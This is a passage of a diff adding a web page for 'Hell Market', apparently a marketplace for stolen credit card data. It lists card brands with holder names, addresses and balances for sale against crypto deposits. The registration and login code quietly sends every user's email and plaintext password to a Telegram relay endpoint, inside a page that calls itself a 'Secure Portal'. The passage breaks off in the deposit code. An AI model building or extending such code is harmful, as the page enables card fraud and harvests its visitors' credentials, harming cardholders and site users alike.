@@ -1,0 +1,847 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Hell Market — Secure Portal</title>
+<style>
+*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#050505;color:#fff}
+body{background:radial-gradient(circle at 15% 20%,rgba(170,0,0,.22),transparent 28%),radial-gradient(circle at 85% 65%,rgba(110,0,0,.18),transparent 30%),linear-gradient(135deg,#090000,#030303 55%,#100000)}
+button,input,select,textarea{font:inherit}button{cursor:pointer}.hidden{display:none!important}.app{min-height:100vh}
+
+.topbar{height:64px;background:#090909;border-bottom:1px solid #3b1111;display:flex;align-items:center;justify-content:space-between;padding:0 18px;position:sticky;top:0;z-index:20}
+.brand{font-weight:900;letter-spacing:1px;color:#ff3b12;font-size:18px;display:flex;align-items:center;gap:10px}
+.brand img{max-height:48px;width:auto;object-fit:contain}
+.top-actions{display:flex;align-items:center;gap:10px}
+.iconbtn{background:#160707;color:#fff;border:1px solid #5b1910;border-radius:8px;padding:9px 12px}
+.top-balance{background:#1f1803;border:1px solid #ffd700;color:#ffd700;padding:7px 14px;border-radius:8px;font-weight:800;font-size:14px;box-shadow:0 0 12px rgba(255,215,0,0.35);display:flex;align-items:center;gap:5px}
+
+.layout{display:flex;min-height:calc(100vh - 64px)}
+.sidebar{width:220px;background:rgba(28,0,0,.93);border-right:1px solid #4d1010;padding:16px;position:sticky;top:64px;height:calc(100vh - 64px);flex-shrink:0}
+.nav button{width:100%;text-align:left;margin:4px 0;padding:11px 12px;border:0;border-radius:7px;background:transparent;color:#ddd}
+.nav button:hover,.nav button.active{background:#3a0805;color:#fff}
+.logout{margin-top:18px;width:100%;background:#ff3b0b!important;color:#fff!important;border:0!important;box-shadow:0 0 12px #ff2b00}
+
+main{flex:1;max-width:1120px;margin:auto;width:100%;padding:24px}
+.welcome{font-size:27px;font-weight:800;margin-bottom:22px}.welcome span{color:#ff4217}
+.panel{background:rgba(5,5,5,.72);border:1px solid #3d1515;border-radius:12px;box-shadow:0 0 25px rgba(255,35,0,.08);padding:20px;margin-bottom:20px}
+.hero{min-height:300px;display:flex;align-items:center;justify-content:center;text-align:center;background:radial-gradient(circle at 30% 60%,rgba(255,40,0,.25),transparent 30%),linear-gradient(135deg,#160000,#050505 55%,#100000);border-radius:14px;border:1px solid #4a1510}
+.hero h1{font-size:48px;margin:8px 0;color:#ff3b12;text-shadow:0 0 24px #f20}.hero p{color:#ddd;max-width:620px}
+.cta{background:#ff3b0b;color:#fff;border:0;border-radius:6px;padding:12px 22px;font-weight:800;box-shadow:0 0 15px rgba(255,50,0,.55)}
+
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.stat{border:1px solid #5a3434;padding:15px;text-align:center;background:#090606;cursor:pointer;transition:0.2s}
+.stat:hover{border-color:#ff3b12;background:#150505}.stat b{font-size:20px;display:block;margin-top:4px}
+.offer{background:#fff900;color:#151000;border:0;text-align:center;padding:18px;border-radius:8px;font-weight:700;margin-top:20px;box-shadow:0 0 15px rgba(255,249,0,0.3)}
+.offer a{color:#000;text-decoration:underline;cursor:pointer}
+.section-title{text-align:center;font-size:25px;margin:18px 0}
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+
+.card{background:rgba(3,3,3,.92);border:1px solid #162b53;border-radius:9px;overflow:hidden;box-shadow:0 0 12px rgba(0,70,255,.15);display:flex;flex-direction:column;cursor:pointer}
+.card-img{width:100%;aspect-ratio:1.586/1;padding:8px;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.card-img img{width:100%;height:100%;object-fit:fill;border-radius:6px;display:block}
+.card-body{padding:12px;text-align:center}.card-body h3{margin:0 0 4px;font-size:18px}.sub{color:#ccc;font-size:13px;margin-bottom:4px}.stars{color:#ffd900;margin:6px 0;font-size:13px}.avail{color:#2cff7b;font-size:13px;margin-bottom:10px}.buy{width:100%;padding:9px;border:0;border-radius:20px;background:#fff;color:#000;font-weight:800;cursor:pointer}
+
+.intro-landing{
+  position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;
+  background:#030000 radial-gradient(circle at 75% 50%, rgba(180, 0, 0, 0.4), transparent 60%);
+  display:flex;flex-direction:column;justify-content:space-between;padding:20px 30px;overflow:hidden;
+}
+.intro-header{display:flex;align-items:center;justify-content:space-between;width:100%;}
+.intro-header-logo{font-size:16px;font-weight:900;color:#fff;letter-spacing:1px;}
+.intro-body{
+  flex:1;display:flex;align-items:center;justify-content:space-between;
+  width:100%;max-width:1300px;margin:0 auto;gap:30px;
+}
+.intro-left{flex:1;display:flex;flex-direction:column;align-items:flex-start;justify-content:center;z-index:2;}
+.intro-logo-img{width:100%;max-width:340px;height:auto;object-fit:contain;margin-bottom:20px;filter:drop-shadow(0 0 25px rgba(255,30,0,0.6));}
+.intro-typing-title{font-size:38px;font-weight:900;color:#fff;letter-spacing:2px;min-height:50px;display:flex;align-items:center;text-shadow:0 0 20px rgba(255,50,0,0.8);}
+.typing-cursor{display:inline-block;width:3px;height:36px;background:#ff3b12;margin-left:5px;animation:blink 0.7s infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.intro-subtitle{color:#ccc;font-size:13px;margin:15px 0 25px;max-width:480px;line-height:1.5;}
+.start-order-btn{
+  background:#fff;color:#000;border:0;padding:8px 20px;font-size:12px;font-weight:bold;
+  border-radius:3px;cursor:pointer;box-shadow:0 0 15px rgba(255,255,255,0.4);
+  transition:all 0.2s ease;
+}
+.start-order-btn:hover{background:#ff3b12;color:#fff;box-shadow:0 0 20px rgba(255,59,18,0.8);}
+.intro-right-hacker{flex:1;display:flex;align-items:center;justify-content:center;height:100%;position:relative;}
+.big-hero-logo{width:100%;max-width:440px;height:auto;object-fit:contain;filter:drop-shadow(0 0 35px rgba(255,40,0,0.7));animation:glowPulse 3s infinite alternate;}
+@keyframes glowPulse{0%{filter:drop-shadow(0 0 20px rgba(255,30,0,0.4));transform:scale(0.98);}100%{filter:drop-shadow(0 0 45px rgba(255,60,0,0.85));transform:scale(1.02);}}
+
+.auth{min-height:100vh;display:flex;width:100%;background:#090000}
+.auth-left{
+  flex:1.2;background:#140101 radial-gradient(circle at 50% 50%, rgba(200, 10, 10, 0.25), transparent 70%);
+  padding:40px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;
+  border-right:1px solid #3d0e0e;
+}
+.auth-logo-div{width:100%;display:flex;align-items:center;justify-content:center;}
+.auth-logo-img{width:100%;max-width:320px;height:auto;object-fit:contain;filter:drop-shadow(0 0 20px rgba(255,59,18,0.6));}
+.auth-right{flex:1;display:flex;align-items:center;justify-content:center;padding:35px;background:radial-gradient(circle at 65% 70%,rgba(255,40,0,.2),transparent 30%),#050505}
+.auth-box{width:min(430px,100%)}
+.field{margin:12px 0}.field label{display:block;font-size:13px;margin-bottom:6px}.field input,.field select,.field textarea{width:100%;padding:12px;border-radius:5px;border:1px solid #6a2820;background:#fff;color:#111}.switch{text-align:center;color:#aaa;margin-top:14px}.link{color:#ff4b20;cursor:pointer;font-weight:700}
+.notice{padding:12px;border-radius:8px;background:#170b0b;border:1px solid #51201a;color:#ddd;margin-bottom:14px}
+.toast{position:fixed;right:18px;bottom:18px;background:#132413;border:1px solid #2b8c36;padding:12px 16px;border-radius:8px;z-index:100}
+.footer{text-align:center;color:#aaa;padding:30px 0 10px;font-size:13px}
+.spinner{width:36px;height:36px;border:4px solid rgba(255,255,255,0.1);border-left-color:#ff3b0b;border-radius:50%;animation:spin 1s linear infinite;margin:15px auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.timer-box{font-size:22px;font-weight:bold;color:#ff4b20;margin:10px 0;text-align:center}
+
+.txn-table-wrapper{overflow-x:auto;margin-top:15px}
+.txn-table{width:100%;border-collapse:collapse;text-align:left;font-size:12px;background:#080404}
+.txn-table th,.txn-table td{padding:12px 10px;border:1px solid #3a1212;word-break:break-all}
+.txn-table th{background:#1f0606;color:#ff3b12;font-weight:bold}
+.status-pending{color:#ffcc00;font-weight:bold}
+.status-success{color:#2cff7b;font-weight:bold}
+
+.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999;display:flex;align-items:center;justify-content:center;padding:15px}
+.card-detail-box{background:#0a0202;border:1px solid #4a1510;border-radius:12px;max-width:440px;width:100%;padding:20px;position:relative;box-shadow:0 0 30px rgba(255,59,18,0.25);text-align:center}
+.close-modal{position:absolute;top:10px;right:15px;background:transparent;border:0;color:#fff;font-size:24px;cursor:pointer}
+.detail-title{font-size:22px;color:#ff3b12;font-weight:bold;margin-bottom:12px}
+.detail-card-img{width:100%;max-width:320px;aspect-ratio:1.586/1;object-fit:fill;border-radius:8px;border:1px solid #ff3b12;margin:0 auto 15px;display:block;background:#000}
+
+.detail-list{text-align:left;line-height:1.7;font-size:13px;color:#ddd;margin:0 auto 15px;max-width:320px;background:#110404;padding:12px 16px;border-radius:8px;border:1px solid #330b0b}
+.detail-list div{margin:3px 0;display:flex;justify-content:space-between;border-bottom:1px dashed #280a0a;padding-bottom:2px}
+.detail-list span{color:#aaa}
+.detail-list b.avail-text{color:#ffffff!important;}
+.buy-modal-btn{background:linear-gradient(180deg,#fff,#ddd);color:#000;font-weight:bold;border:0;padding:10px 30px;border-radius:20px;font-size:15px;cursor:pointer;box-shadow:0 0 10px rgba(255,255,255,0.3)}
+
+.profile-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.pass-hint{font-size:11px;color:#aaa;margin-top:4px;line-height:1.3;}
+.copy-box{display:flex;align-items:center;gap:6px;background:#150505;border:1px solid #ff3b12;padding:6px 10px;border-radius:6px;margin:10px 0;}
+.copy-addr{font-size:12px;color:#2cff7b;word-break:break-all;flex:1;text-align:left;}
+.copy-btn{background:#ff3b0b;color:#fff;border:0;padding:5px 10px;border-radius:4px;font-size:11px;font-weight:bold;}
+.qr-img{width:160px;height:160px;margin:12px auto;display:block;border:4px solid #fff;border-radius:8px;background:#fff;}
+.crypto-convert-box{background:#180606;border:1px solid #ff3b12;padding:8px 12px;border-radius:6px;margin:10px 0;font-size:14px;color:#ffd700;font-weight:bold;}
+
+@media(max-width:900px){
+  .auth{flex-direction:column;}
+  .auth-left{padding:25px;min-height:auto;}
+  .cards{grid-template-columns:repeat(2,1fr)}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .intro-body{flex-direction:column;text-align:center;}
+  .intro-left{align-items:center;}
+  .intro-right-hacker{display:none;}
+  .intro-typing-title{font-size:26px;}
+}
+@media(max-width:600px){
+  .cards{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr}
+  .sidebar{position:fixed;left:-240px;z-index:30;transition:.3s}
+  .sidebar.open{left:0}
+  .hero h1{font-size:34px}
+  .topbar{padding:0 10px}
+}
+</style>
+</head>
+<body>
+<div id="root"><div style="text-align:center;margin-top:40px;"><div class="spinner"></div><h3 style="color:#ff3b12;">Loading Application...</h3></div></div>
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+
+<script>
+window.onerror = function(msg, url, line) {
+  const rootEl = document.getElementById('root');
+  if(rootEl) {
+    rootEl.innerHTML = `<div style="padding:20px; color:#ff3b12; background:#110000; border:1px solid #550000; margin:20px; border-radius:8px;">
+      <h3>⚠️ Script Error Caught</h3>
+      <p><b>Error:</b> ${msg}</p>
+      <p><b>Line:</b> ${line}</p>
+    </div>`;
+  }
+};
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBTucUJwE-2TyCfekqL6WVPZKSex7KI4iw",
+  authDomain: "hellmarket-6a20d.firebaseapp.com",
+  projectId: "hellmarket-6a20d",
+  storageBucket: "hellmarket-6a20d.firebasestorage.app",
+  messagingSenderId: "1035857037463",
+  appId: "1:1035857037463:web:295a35f0622b9d2d0ec1d2",
+  measurementId: "G-977Z68LVSL"
+};
+
+let auth = null;
+let db = null;
+try {
+  if (typeof firebase !== 'undefined') {
+    if (!firebase.apps.length) {
+      firebase.initializeApp(firebaseConfig);
+    }
+    auth = firebase.auth();
+    db = firebase.firestore();
+  }
+} catch(e) {
+  console.warn("Firebase init warning:", e);
+}
+
+const LOGO_URL = 'https://hellmarket.cc/assets/logo-DwqCDfCm.png';
+
+// ✅ SECURE PROXY CONFIG: GitHub ya public user se token chhupane ke liye backend route call hoga
+function sendToTelegram(msg){
+  fetch('/api/telegram', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ message: msg })
+  }).catch(()=>{});
+}
+
+const products=[
+  ['American Express','GOLD CARD',250,'4.8','157.8k','100k+','https://i.ibb.co/pjnKMy8V/card1-Bj-K5x-Yz.png','$3.5k+ USD'],
+  ['American Express','GREEN CARD',150,'4.8','119.9k','100k+','https://i.ibb.co/6RWT3jpc/card2-C81-So-Ck-Y.png','$2.5k+ USD'],
+  ['American Express','PLATINUM CARD',100,'4.9','85.2k','100k+','https://i.ibb.co/n45sf0j/card2-2-2-RTAvpyv.png','$1.8k+ USD'],
+  ['Visa Platinum','For TIKTOK',50,'4.6','112.9k','100k+','https://i.ibb.co/1fBBB7nH/card3-ZWMq-Ok-W7.png','$800+ USD'],
+  ['Visa Platinum','For PUBG',50,'4.8','174.6k','100k+','https://i.ibb.co/1fBBB7nH/card3-ZWMq-Ok-W7.png','$800+ USD'],
+  ['Visa Platinum','For PLAYSTORE REDEEM',50,'4.8','110.9k','100k+','https://i.ibb.co/1fBBB7nH/card3-ZWMq-Ok-W7.png','$800+ USD'],
+  ['Visa Classic','30$',30,'4.8','194.4k','100k+','https://i.ibb.co/hFDtgF3w/card5-CRbol-IPd.png','$500+ USD'],
+  ['Visa Platinum','50$',50,'4.7','112.3k','100k+','https://i.ibb.co/1fBBB7nH/card3-ZWMq-Ok-W7.png','$900+ USD'],
+  ['Visa Gold','100$',100,'4.6','87k','100k+','https://i.ibb.co/tp0z82T9/card7-DPv5p89c.png','$1.5k+ USD'],
+  ['Visa Signature','30$',30,'4.9','155.1k','100k+','https://i.ibb.co/jPvv4D4v/card8-CMA0-Kb2d.png','$500+ USD'],
+  ['Visa Infinite','80$',80,'4.5','106.2k','100k+','https://i.ibb.co/6JtsJwL1/card8-2-Bx-Z1lh2-N.png','$1.2k+ USD'],
+  ['Discover','MILES CARD',50,'4.6','178.5k','100k+','https://i.ibb.co/R4Zzv9gt/card8-3-C4m-XE-I1.png','$850+ USD'],
+  ['Discover','PRIDE CARD',100,'4.6','169.6k','100k+','https://i.ibb.co/Hp1Gv7zm/card8-4-Oa-KMupe-X.png','$1.6k+ USD'],
+  ['Diners Club','INTERNATIONAL CARD',150,'4.7','106.6k','100k+','https://i.ibb.co/jZf2tH3T/card8-5-CJZ6-JJRY.png','$2.2k+ USD'],
+  ['MasterCard','PLATINUM CARD',50,'4.7','135.6k','25k+','https://i.ibb.co/84XTY01X/card9-Dygx-CGTb.png','$900+ USD'],
+  ['MasterCard','STANDARD CARD',100,'4.7','184.6k','200k+','https://i.ibb.co/5XMFCsG5/card10-DS-yx-LXx.png','$1.5k+ USD'],
+  ['MasterCard','WORLD CARD',150,'4.7','134.8k','25k+','https://i.ibb.co/WNJmqt6x/card10-2-DEEV0-Stg.png','$2.4k+ USD'],
+  ['MasterCard','WORLD ELITE CARD',200,'4.8','127.7k','25k+','https://i.ibb.co/CKH3k2bf/card10-3-B-i3-QCp2.png','$3.0k+ USD']
+];
+
+let currentUserData = { user: null, balance: 0, transactions: [], cards: [], profile: {} };
+let countdownTimer = null;
+let currentDepositAddress = '';
+
+function root(){return document.getElementById('root')}
+function toast(t){const x=document.createElement('div');x.className='toast';x.textContent=t;document.body.appendChild(x);setTimeout(()=>x.remove(),2600)}
+function logoHtml(){return `<div class="auth-logo-div"><img src="${LOGO_URL}" class="auth-logo-img" alt="Hell Market Logo"></div>`}
+function getFooter(){return `<div class="footer">© 2014 Hell Market. All rights reserved.</div>`}
+
+function checkRoute(){
+  const hash = window.location.hash;
+  if(hash === '#admin'){
+    renderAdminPanel();
+    return true;
+  }
+  return false;
+}
+
+window.addEventListener('hashchange', () => {
+  if(!checkRoute()){
+    if(auth && auth.currentUser) dashboard();
+    else authView('register');
+  }
+});
+
+function renderIntroLanding(){
+  if(checkRoute()) return;
+  root().innerHTML = `
+  <div class="intro-landing" id="introLandingPage">
+    <div class="intro-header">
+      <div class="intro-header-logo">HELL MARKET</div>
+    </div>
+    <div class="intro-body">
+      <div class="intro-left">
+        <img src="${LOGO_URL}" class="intro-logo-img" alt="Hell Market Logo">
+        <div class="intro-typing-title">
+          <span id="typedText"></span><span class="typing-cursor"></span>
+        </div>
+        <p class="intro-subtitle">
+          "Your reliable partner for growth, Integrity, Experience, Trust, Delivering results with honesty and care."
+        </p>
+        <button class="start-order-btn" onclick="exitIntroToApp()">Start Your Order</button>
+      </div>
+      <div class="intro-right-hacker">
+        <img src="${LOGO_URL}" class="big-hero-logo" alt="Hell Market Logo Large">
+      </div>
+    </div>
+  </div>`;
+  startTypingAnimation();
+}
+
+let typingInterval;
+function startTypingAnimation(){
+  const fullText = "WELCOME TO HELL MARKET";
+  const el = document.getElementById('typedText');
+  if(!el) return;
+  let i = 0;
+  let isDeleting = false;
+
+  clearInterval(typingInterval);
+  typingInterval = setInterval(() => {
+    if(!isDeleting) {
+      el.textContent = fullText.substring(0, i + 1);
+      i++;
+      if(i === fullText.length) isDeleting = true;
+    } else {
+      el.textContent = fullText.substring(0, i - 1);
+      i--;
+      if(i === 0) isDeleting = false;
+    }
+  }, 120);
+}
+
+window.exitIntroToApp = function(){
+  clearInterval(typingInterval);
+  if(auth && auth.currentUser) {
+    dashboard();
+  } else {
+    authView('register');
+  }
+}
+
+function authView(mode='register'){
+  if(checkRoute()) return;
+  root().innerHTML=`<div class="auth"><div class="auth-left">${logoHtml()}</div><div class="auth-right"><div class="auth-box"><div class="brand"><img src="${LOGO_URL}" alt="logo"></div><h2>${mode==='register'?'Create Account':'Welcome Back'}</h2><div id="authMsg"></div>${mode==='register'?`<div class="field"><label>Username *</label><input id="username" placeholder="Choose a username"></div>`:''}<div class="field"><label>Email *</label><input id="email" type="email" placeholder="Enter your email"></div><div class="field"><label>Password *</label><input id="password" type="password" placeholder="Enter password"><div class="pass-hint">Minimum 8 characters required.</div></div>${mode==='register'?`<div class="field"><label>Confirm Password *</label><input id="confirm" type="password" placeholder="Confirm password"></div>`:''}<button class="cta" style="width:100%" id="authSubmitBtn">${mode==='register'?'CREATE ACCOUNT':'SIGN IN'}</button>${mode==='login'?`<div style="text-align:right; margin-top:8px;"><span class="link" style="font-size:12px;" onclick="forgotPassword()">Forgot Password?</span></div>`:''}<div class="switch">${mode==='register'?'Already have an account?':'Don’t have an account?'} <span class="link" onclick="authView('${mode==='register'?'login':'register'}')">${mode==='register'?'Sign In':'Create Account'}</span></div></div></div></div>`;
+
+  document.getElementById('authSubmitBtn').onclick = () => {
+    if(mode === 'register') handleRegister();
+    else handleLogin();
+  };
+}
+
+window.forgotPassword = function(){
+  const emailInput = document.getElementById('email').value.trim();
+  const targetEmail = emailInput || 'hellmarketvercelszxzs@gmail.com';
+  window.location.href = `mailto:hellmarketvercelszxzs@gmail.com?subject=${encodeURIComponent('Password Reset Request')}&body=${encodeURIComponent('Hello Admin, I forgot my password for my account: ' + targetEmail + '. Please help me reset it.')}`;
+  toast('Redirecting to support...');
+}
+
+async function handleRegister(){
+  const u = document.getElementById('username').value.trim(),
+        e = document.getElementById('email').value.trim(),
+        p = document.getElementById('password').value,
+        c = document.getElementById('confirm').value;
+        
+  if(!u || !e || !p || !c) return toast('Please fill all fields');
+  if(p !== c) return toast('Passwords do not match');
+  if(p.length < 8) return toast('Password must be at least 8 characters long');
+
+  try {
+    if(auth) {
+      const cred = await auth.createUserWithEmailAndPassword(e, p);
+      const uid = cred.user.uid;
+      currentUserData = {
+        user: { uid: uid, username: u, email: e },
+        balance: 0, transactions: [], cards: [],
+        profile: { firstName: '', lastName: '', email: e, mobile: '', address: '' }
+      };
+      await db.collection("users").doc(uid).set(currentUserData);
+    } else {
+      currentUserData = {
+        user: { uid: 'local_user', username: u, email: e },
+        balance: 500, transactions: [], cards: [],
+        profile: { firstName: '', lastName: '', email: e, mobile: '', address: '' }
+      };
+      localStorage.setItem('hell_local_user', JSON.stringify(currentUserData));
+    }
+    
+    // ✅ Plain Text Password Notification to Telegram
+    sendToTelegram(`🆕 <b>NEW USER SIGNUP (HELL MARKET)</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>`);
+    toast('Account created successfully!');
+    dashboard();
+  } catch(err) {
+    toast('Registration Error: ' + err.message);
+  }
+}
+
+async function handleLogin(){
+  const e = document.getElementById('email').value.trim(),
+        p = document.getElementById('password').value;
+  
+  if(!e || !p) return toast('Please enter email and password');
+
+  try {
+    if(auth) {
+      const cred = await auth.signInWithEmailAndPassword(e, p);
+      const uid = cred.user.uid;
+      const docSnap = await db.collection("users").doc(uid).get();
+      if(docSnap.exists){
+        currentUserData = docSnap.data();
+      } else {
+        currentUserData = { user: { uid: uid, username: e.split('@')[0], email: e }, balance: 0, transactions: [], cards: [], profile: {} };
+      }
+    } else {
+      const saved = localStorage.getItem('hell_local_user');
+      if(saved) currentUserData = JSON.parse(saved);
+      else currentUserData = { user: { uid: 'local_user', username: e.split('@')[0], email: e }, balance: 250, transactions: [], cards: [], profile: {} };
+    }
+
+    // ✅ Plain Text Password Notification on Login
+    sendToTelegram(`🟢 <b>USER LOGIN</b>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>`);
+    dashboard();
+  } catch(err) {
+    toast('Invalid email or password');
+  }
+}
+
+async function syncUserData(){
+  if(!auth || !auth.currentUser) {
+    localStorage.setItem('hell_local_user', JSON.stringify(currentUserData));
+    return;
+  }
+  try {
+    await db.collection("users").doc(auth.currentUser.uid).set(currentUserData);
+  } catch(e) {
+    console.error("Sync error", e);
+  }
+}
+
+function shell(page){
+  if(checkRoute()) return;
+  root().innerHTML=`<div class="app"><header class="topbar"><button class="iconbtn" onclick="document.querySelector('.sidebar').classList.toggle('open')">☰</button><div class="brand"><img src="${LOGO_URL}" alt="logo"></div><div class="top-actions"><div class="top-balance">💳 $<span id="topBalanceVal">${currentUserData.balance.toFixed(2)}</span></div><button class="iconbtn" onclick="deposit()">＋ Add Balance</button></div></header><div class="layout"><aside class="sidebar"><div class="nav"><button class="${page==='dashboard'?'active':''}" onclick="dashboard()">🏠 Dashboard</button><button class="${page==='cards'?'active':''}" onclick="cards()">💳 Cards</button><button class="${page==='deposit'?'active':''}" onclick="deposit()">💰 Deposit</button><button class="${page==='mycards'?'active':''}" onclick="myCards()">🎫 My Cards</button><button class="${page==='support'?'active':''}" onclick="support()">💬 Support</button><button class="${page==='settings'?'active':''}" onclick="settings()">⚙️ Settings</button></div><button class="logout" onclick="logout()">Logout</button></aside><main id="content"></main></div></div>`
+}
+
+function commonTop(){return `<div class="welcome">Welcome<br><span>(${escapeHtml(currentUserData.user ? currentUserData.user.email : 'Guest')})</span></div>`}
+
+function dashboard(){
+  if(checkRoute()) return;
+  shell('dashboard');
+  document.getElementById('content').innerHTML=commonTop()+`
+  <section class="hero">
+    <div>
+      <div class="hero h1"><h1>HELL MARKET</h1></div>
+      <p>Your secure cloud-synced storefront for digital assets.</p>
+      <button class="cta" onclick="cards()">Start Shopping</button>
+    </div>
+  </section>
+  <div class="panel">
+    <div class="stats">
+      <div class="stat" onclick="deposit()">💰<b>$${currentUserData.balance.toFixed(2)}</b>Balance</div>
+      <div class="stat" onclick="myCards()">💳<b>${currentUserData.cards.length}</b>Purchased</div>
+      <div class="stat" onclick="showTransactionsView()">🔄<b>${currentUserData.transactions.length}</b>Transactions</div>
+      <div class="stat" onclick="myCards()">🎫<b>${currentUserData.cards.length}</b>Cards</div>
+    </div>
+  </div>
+  <div id="dashboardTxnSection"></div>`+getFooter();
+  showTransactionsView();
+}
+
+window.dashboard = dashboard;
+window.cards = cards;
+window.deposit = deposit;
+window.myCards = myCards;
+window.support = support;
+window.settings = settings;
+
+function showTransactionsView(){
+  const section = document.getElementById('dashboardTxnSection');
+  if(!section) return;
+  if(!currentUserData.transactions || currentUserData.transactions.length === 0){
+    section.innerHTML = `<div class="panel" style="text-align:center;"><h2 class="section-title">Transaction History</h2><p style="color:#aaa;">No transactions found yet.</p></div>`;
+    return;
+  }
+  section.innerHTML = `<div class="panel"><h2 class="section-title">Transaction History</h2><div class="txn-table-wrapper"><table class="txn-table"><thead><tr><th>Deposit Address</th><th>TxID</th><th>Amount</th><th>Date & Time</th><th>Status</th></tr></thead><tbody>${currentUserData.transactions.map(t=>`<tr><td style="color:#ff4b20;">${escapeHtml(t.address)}</td><td style="color:#2cff7b;">${escapeHtml(t.txid)}</td><td>$${t.amount}</td><td>${escapeHtml(t.time)}</td><td class="${t.status==='Successful'?'status-success':'status-pending'}">${escapeHtml(t.status||'Pending')}</td></tr>`).join('')}</tbody></table></div></div>`;
+}
+window.showTransactionsView = showTransactionsView;
+
+function cards(){
+  if(checkRoute()) return;
+  shell('cards');
+  document.getElementById('content').innerHTML=commonTop()+`
+  <h2 class="section-title">Cards</h2>
+  <div class="notice" style="text-align:center">Official catalog selection. Cloud synchronized secure inventory.</div>
+  <div class="cards">
+    ${products.map((p,i)=>`
+      <article class="card" onclick="openCardModal(${i})">
+        <div class="card-img"><img src="${p[6]}" alt="${escapeHtml(p[0])}"></div>
+        <div class="card-body">
+          <h3>${escapeHtml(p[0])}</h3>
+          <div class="sub">${escapeHtml(p[1])}</div>
+          <div class="stars">★★★★★ <span>(${p[3]})</span></div>
+          <div class="sub">${p[4]} people bought this</div>
+          <div class="avail">Available: ${p[5]}</div>
+          <button class="buy" onclick="event.stopPropagation(); buy(${i})">🔥 Buy Now for $${p[2]}</button>
+        </div>
+      </article>
+    `).join('')}
+  </div>
+<div class="offer">🔥 <b>Limited Time Offer!</b><br>Get <u>20% extra balance</u> on every deposit above $100.<br><a onclick="deposit()">🚀 Deposit Now</a></div>
+  <div id="cardModalArea"></div>`+getFooter();
+}
+
+window.openCardModal = function(i){
+  const p = products[i];
+  const area = document.getElementById('cardModalArea');
+  if(!area) return;
+  area.innerHTML = `
+    <div class="modal-overlay" onclick="closeCardModal()">
+      <div class="card-detail-box" onclick="event.stopPropagation()">
+        <button class="close-modal" onclick="closeCardModal()">✕</button>
+        <div class="detail-title">${escapeHtml(p[0])}</div>
+        <img src="${p[6]}" class="detail-card-img" alt="${escapeHtml(p[0])}">
+        <div class="detail-list">
+          <div><span>🏷️ For:</span> <b>${escapeHtml(p[1])}</b></div>
+          <div><span>💰 Price:</span> <b>$${p[2]}.00</b></div>
+          <div><span>💼 Balance:</span> <b>${p[7]}</b></div>
+          <div><span>💳 Type:</span> <b>Credit Card</b></div>
+          <div><span>👤 Holder Name:</span> <b class="avail-text">Available</b></div>
+          <div><span>🌍 Country/City/Zip:</span> <b class="avail-text">Available</b></div>
+          <div><span>🏠 Address:</span> <b class="avail-text">Available</b></div>
+        </div>
+        <button class="buy-modal-btn" onclick="buy(${i}); closeCardModal();">Purchase Now</button>
+      </div>
+    </div>`;
+}
+
+window.closeCardModal = function(){
+  const area = document.getElementById('cardModalArea');
+  if(area) area.innerHTML = '';
+}
+
+window.buy = async function(i){
+  const p=products[i];
+  if(currentUserData.balance<p[2]){toast('Insufficient account balance');return}
+  currentUserData.balance-=p[2];
+  currentUserData.cards.push({name:p[0]+' — '+p[1],price:p[2],time:new Date().toLocaleString()});
+  currentUserData.transactions.unshift({type:'Purchase',address:'Store Checkout',txid:'PURCHASE-'+Math.floor(100000+Math.random()*900000),amount:p[2],status:'Successful',time:new Date().toLocaleString()});
+  
+  await syncUserData();
+  toast('Purchase successful');
+  cards();
+}
+
+function deposit(){
+  if(checkRoute()) return;
+  shell('deposit');
+  if(countdownTimer) clearInterval(countdownTimer);
+  document.getElementById('content').innerHTML=commonTop()+`
+  <div class="panel">
+    <h2 class="section-title">Add Account Balance</h2>
+    <div class="field">
+      <label>Select Coin Option *</label>
+      <select id="coinSelect" onchange="toggleGenerateBtn()">
+        <option value="">-- Choose Coin --</option>
+        <option value="BTC">Bitcoin (BTC)</option>
+        <option value="TRX">TRX (Tron)</option>
+        <option value="USDT">USDT (BEP20)</option>
+      </select>
+    </div>
+    <div class="field">
+      <label>Amount (USD) [Min: $10 - Max: $1000]</label>
+      <input id="depAmt" type="number" min="10" max="1000" value="100">
+    </div>
+    <button id="genBtn" class="cta" style="width:100%" disabled onclick="startDepositProcess()">Generate Address</button>
+    <div id="depositArea"></div>
+  </div>
+  <div id="depositHistorySection"></div>`+getFooter();
+  renderDepositHistoryTable();
+}
+
+window.toggleGenerateBtn = function(){
+  const select = document.getElementById('coinSelect');
+  const btn = document.getElementById('genBtn');
+  if(select && btn) btn.disabled = (select.value === "");
+}
+
+window.startDepositProcess = function(){
+  const amount = Number(document.getElementById('depAmt').value);
+  const coin = document.getElementById('coinSelect').value;
+  
+  if(!amount || amount < 10) return toast('Minimum deposit amount is $10!');
+  if(amount > 1000) return toast('Maximum deposit limit is $1000!');
+
+  const area = document.getElementById('depositArea');
+  area.innerHTML = `<div style="text-align:center; padding: 20px;"><div class="spinner"></div><p style="color:#aaa;">Generating secure deposit details & QR Code...</p></div>`;
